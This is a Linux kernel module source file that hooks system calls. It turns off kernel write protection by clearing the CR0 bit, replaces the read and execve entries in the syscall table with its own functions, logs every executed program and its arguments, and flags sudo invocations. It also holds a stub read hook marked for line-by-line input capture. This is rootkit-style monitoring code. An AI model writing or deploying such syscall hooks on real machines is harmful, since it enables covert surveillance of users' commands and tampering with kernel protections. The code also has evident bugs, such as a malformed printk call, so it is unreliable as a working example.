#include <linux/net.h>
#include <linux/in.h>
#include <linux/uaccess.h>
#include <linux/binfmts.h>
#include <linux/uaccess.h>
#include <linux/init.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/slab.h>
#include <linux/kern_levels.h>
#include <linux/gfp.h>
#include <asm/unistd.h>
#include <asm/paravirt.h>
#include <linux/kernel.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Zachary Eldridge");
MODULE_DESCRIPTION("Simple Hooking Of a Syscall");
MODULE_VERSION("1.0");

//Unsignedlong pointer pointer that will point to the syscall table
unsigned long **SYS_CALL_TABLE;

void EnablePageWriting(void) {
        write_cr0(read_cr0() & (~0x10000)); //write_cr0 is setting the processor flag to disable a security segment that is on the pages of memory that disables them from being written too. This allows us to write to them
}

void DisablePageWriting(void) {
        write_cr0(read_cr0() | 0x10000); //Disable it again when we are finished 
}

char argz[255][255] = {0};
// The count of the arguments
size_t argc = 0;

char CharBuffer [255] = {'\0'};
char Argz [255] = {'0'};

asmlinkage int (*original_execve)(const char *filename, char *const argv[], char *const envp[]);


//Our version of the Execve syscall
asmlinkage int HookExecve(const char *filename, char *const argv[], char *const envp[]) {
	copy_from_user(&CharBuffer, filename, strnlen_user(filename, sizeof(CharBuffer) - 1 ) );
	printk(KERN_INFO, "Executable Name %s \n", CharBuffer);

	char * ptr = 0xF00D;

	/* Since we don't know the count of args we will go until the 0 arg
	 * We will collect 20 args at max*/
	for(int i = 0; i < 20; i++) {
		if(ptr) { //If the pointer exists
			int success = copy_from_user(&ptr, &argv[i], sizeof(ptr)); //Copy that pointer to our pointer object
			// check for pointer being 0x00
			if(success ==  0&& ptr) { //if copy was a success
				strncpy_from_user(Argz, ptr, sizeof(Argz)); //String copy from the pointer to copy the string 
				printk(KERN_INFO "Args %s \n", Argz); //print off the arguments. The strings get stored in our Argz array
				memset(Argz, 0, sizeof(Argz));
			}
		}
	}
       // We need to check if SUDO is called.
        if( strcmp(CharBuffer , "/usr/bin/sudo" ) == 0   ){
            printk( KERN_INFO "Sudo Executed! ");

        }

	return (*original_execve)(filename, argv, envp);
}

asmlinkage int (*original_read)(unsigned int, void __user*, size_t);
asmlinkage int  HookRead(unsigned int fd, void __user* buf, size_t count) {
        //printk(KERN_INFO "READ HOOKED HERE! -- This is our function!");

  //TODO Read if buffer one byte until byte == \n

        return (*original_read)(fd, buf, count);
}



static int __init SetHooks(void) {
	// Gets Syscall Table **
 	SYS_CALL_TABLE = (unsigned long**)kallsyms_lookup_name("sys_call_table"); 

	printk(KERN_INFO "Hooks Will Be Set.\n");
	printk(KERN_INFO "System call table at %p\n", SYS_CALL_TABLE);


	EnablePageWriting();

    // Replaces Pointer Of Syscall_read on our syscall.
	


	// KEEP THIS ORDER!!! 
	// CRASH WILL HAPPEN
	original_read = (void*)SYS_CALL_TABLE[__NR_read];
	SYS_CALL_TABLE[__NR_read] = (unsigned long*)HookRead;

	original_execve = (void*)SYS_CALL_TABLE[__NR_execve];
	SYS_CALL_TABLE[__NR_execve] = (unsigned long*)HookExecve;
	
	DisablePageWriting();

	return 0;
}

static void __exit HookCleanup(void) {

	// Clean up our Hooks
	EnablePageWriting();
	SYS_CALL_TABLE[__NR_read]   = (unsigned long*)original_read;
	SYS_CALL_TABLE[__NR_execve] = (unsigned long*)original_execve;
	DisablePageWriting();

	printk(KERN_INFO "HooksCleaned Up!");
}

module_init(SetHooks);
module_exit(HookCleanup);

